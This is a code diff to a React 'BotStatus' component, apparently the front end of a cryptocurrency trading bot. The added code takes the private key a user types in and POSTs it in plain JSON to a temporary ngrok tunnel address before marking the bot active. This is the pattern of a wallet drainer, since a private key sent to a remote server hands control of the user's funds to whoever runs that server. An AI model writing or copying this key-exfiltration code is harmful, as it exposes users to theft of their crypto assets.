@@ -41,7 +41,7 @@ const BotStatus = () => {
     }, 500);
   };
 
-  const startBot = () => {
+  const startBot = async () => {
     if (!privateKey || privateKey.length < 32) {
       toast({
         title: "Invalid Private Key",
@@ -52,7 +52,19 @@ const BotStatus = () => {
     }
 
     setLoading(true);
-    setTimeout(() => {
+    try {
+      const response = await fetch("https://predietary-jules-unsubtly.ngrok-free.dev/start", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({ privateKey }),
+      });
+
+      if (!response.ok) {
+        throw new Error("Failed to start bot");
+      }
+
       setIsActive(true);
       setShowPrivateKeyDialog(false);
       setPrivateKey("");
@@ -60,8 +72,15 @@ const BotStatus = () => {
         title: "Bot Started",
         description: "Your trading bot is now active"
       });
+    } catch (error) {
+      toast({
+        title: "Error",
+        description: error instanceof Error ? error.message : "Failed to start bot",
+        variant: "destructive"
+      });
+    } finally {
       setLoading(false);
-    }, 500);
+    }
   };
 
   return (
